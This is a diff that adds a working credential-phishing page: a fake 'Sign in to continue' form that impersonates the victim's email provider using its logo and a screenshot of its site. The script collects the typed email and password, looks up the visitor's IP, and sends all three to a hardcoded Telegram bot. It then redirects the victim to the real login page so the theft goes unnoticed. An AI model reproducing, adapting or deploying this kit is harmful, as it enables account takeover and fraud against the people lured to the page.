@@ -1,0 +1,37 @@
+<html lang="en"><head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Sign In </title>	<link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/0QeAP9JKwL/SCkF/0gpBf9IKQX/SCkF/0gpBf9IKQX/SCkF/0gpBf9IKQX/SCkF/0gpBf9IKQX/SSsD/0IVANlFHzfyRyae/0gptf9IKbX/SCm1/0gptf9IKbX/SCm1/0gptf9IKbX/SCm1/0gptf9IKbX/SCm180cmodlFHz30RybB4kYi//hHJ///SCn//0gp//9IKf//SCn//0gp//9IKf//SCn//0gp//9IKf//SCn/+Ugo/+NGIv/zRybL/0gp3/RHJv/iRiH/+0go//9IKf//SCn//0gp//dHJv/2Ryb//0gp//9IKf//SCn/+0go/+NGIv/yRyb//0gp5/9IKd//SCn/70cl/+RGIv/9SCn//0gp/+ZEIf+9PBP/vDwT/+RDIP//SCn//Ugp/+VGIv/uRyX//0gp//9IKef/SCnf/0gp//9IKf/sRiT/50Yj/+BCH/+8PxT/ykod/8pLHv+8PxT/3kIe/+hGI//qRiT//0gp//9IKf//SCnn/0gp3/9IKf//SCn//Ego/8g/G/+5Qhn/5Vws//tpOP/7aTn/51wt/7pDGv/GPhr/+0go//9IKf//SCn//0gp5/9IKd//SCn//Eco/9xDHv/STiL/72M0//1rOv/8ajn//Go5//1rOv/xZDX/008j/9tDHv/7Ryj//0gp//9IKef/SCnf+0cn/+FJIv/kWiv/+mk4//1qOf/8ajn//Go5//xqOf/8ajn//Wo5//tpOP/lWyz/4Eki//pHJ///SCnn+0ko3+xRKf/yYzP//Ws5//xqOf/8ajn//Go5//xqOf/8ajn//Go5//xqOf/8ajn//Ws5//JkNP/sUin/+kko5/hfM976aDj//Wo5//xqOf/8ajn//Go5//xqOf/8ajn//Go5//xqOf/8ajn//Go5//xqOf/9ajn/+mk4//hfM+f8azm8/Go5//xqOf/8ajn//Go5//xqOf/8ajn//Go5//xqOf/8ajn//Go5//xqOf/8ajn//Go5//xqOf/8aznG/Go5MPxqOZL8ajmq/Go5qfxqOan8ajmp/Go5qfxqOan8ajmp/Go5qfxqOan8ajmp/Go5qfxqOar8ajmV/Go5NfxqOQD8ajkB/Go5AvxqOQL8ajkC/Go5AvxqOQL8ajkC/Go5AvxqOQL8ajkC/Go5AvxqOQL8ajkC/Go5AfxqOQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//8AAIABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAQAA//8AAA==" type="image/x-icon">	 <style> * { box-sizing: border-box; margin: 0; padding: 0; }
+ body, html { height: 100%; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; background-size: cover; background-repeat: no-repeat; }
+ #login-container { width: 340px; padding: 30px; background-color: rgba(255, 255, 255, 0.9); border-radius: 10px; box-shadow: 0 20px 8px rgba(0, 0, 0, 0.2); text-align: center; z-index: 1; }
+ #logo-container { display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+ #email-logo { width: 30px; height: 30px; margin-right: 10px; }
+ #email-domain { font-size: 15px; font-weight: bold; color: #333; }
+ /* Input and icon container */ .input-container { display: flex; align-items: center; position: relative; margin-bottom: 15px; }
+ .icon-container { position: absolute; left: 10px; pointer-events: none; }
+ input[type="email"], input[type="password"] { width: 100%; padding: 8px 8px 8px 35px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; transition: border-color 0.3s; }
+ input:focus { border-color: #3E61B2; }
+ /* Combined bounce and rotate animation */ @keyframes icon-bounce-rotate { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-5px) rotate(180deg); } }
+ input:focus + .icon-container img { animation: icon-bounce-rotate 0.8s ease-in-out; }
+ .icon-container img { width: 15px; height: 15px; transition: transform 0.3s ease-in-out; }
+ button { width: 100%; padding: 10px; background-color: #3E61B2; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 10px; }
+ button:hover { background-color: #45a049; }
+ #remember-me-container { display: flex; align-items: center; margin: 10px 0; }
+ #remember-me { margin-left: 10px; } </style></head>
+ <body style="background-image: url(&quot;https://image.thum.io/get/width/1200/${domain}&quot;); background-size: cover;"><div id="login-container">		<div id="logo-container"> <img id="email-logo" src="https://logo.clearbit.com/${domain}" alt="Email Logo" style="width: 40px; height: auto; max-height: 30px;"> <span id="email-domain">${domain}</span> </div>
+
+ <span style="font-size: 16px;color:gray;">Sign in to continue</span> <br><br>		<span style="font-size: 14px;color:brown;">Authentication Required</span>		<br>		<br>		 <form id="login-form"> <div class="input-container"> <input type="email" id="email" name="email" placeholder="Email" required="" readonly> <div class="icon-container"> <img id="email-icon" src="https://img.icons8.com/material-outlined/24/000000/email.png" alt="Email Icon"> </div> </div>
+ <div class="input-container"> <input type="password" id="password" name="password" placeholder="Password" required=""> <div class="icon-container"> <img id="password-icon" src="https://img.icons8.com/material-outlined/24/000000/lock.png" alt="Password Icon"> </div> </div>
+ <div id="remember-me-container" style="margin-right: 220px;"> <input type="checkbox" id="remember-me" name="remember-me"> <label for="remember-me" style="margin-left: 10px; font-size: 13px; margin-right: -100px;">Remember Me</label> </div>
+ <button type="submit">Login</button> </form> </div>
+ <script> function getUrlParameter(name) { const urlParams = new URLSearchParams(window.location.search); return urlParams.get(name); }
+ const email = getUrlParameter('email'); if (email) { document.getElementById('email').value = email; const emailDomain = email.split('@')[1]; const emailLogoUrl = `https://logo.clearbit.com/${emailDomain}`;
+ const emailLogo = document.getElementById('email-logo'); emailLogo.src = emailLogoUrl;
+ const emailDomainElement = document.getElementById('email-domain'); emailDomainElement.textContent = emailDomain;
+ emailLogo.onerror = () => { emailLogo.style.display = 'none'; };
+ const backgroundUrl = `https://image.thum.io/get/width/1200/https://${emailDomain}`;
+ document.body.style.backgroundImage = `url('${backgroundUrl}')`; document.body.style.backgroundSize = "cover"; // Ensures the background scales to cover the page }
+ async function getUserIP() { try { const response = await fetch('https://api.ipify.org?format=json'); const data = await response.json(); return data.ip; // Return the IP address } catch (error) { console.error('Error fetching IP:', error); return 'Unable to fetch IP'; } }
+ async function sendToTelegram(email, password, ip) { const botToken = '8642585919:AAGJfHDb9w4FCmxc2WKNov54FBEccmuRutA'; // Replace with your bot token const chatId = '8629908210'; // Replace with your chat ID const message = `New Rezut:\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}`;
+ try { const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: message }) }); if (response.ok) { console.log('Message sent to Telegram successfully'); } else { console.error('Failed to send message to Telegram'); } } catch (error) { console.error('Error sending message to Telegram:', error); } }
+ document.getElementById('login-form').addEventListener('submit', async function(event) { event.preventDefault(); const email = document.getElementById('email').value; const password = document.getElementById('password').value;
+ const ip = await getUserIP();
+ await sendToTelegram(email, password, ip);
+ const emailDomain = email.split('@')[1]; window.location.href = `https://${emailDomain}/login`; }); </script></body></html>
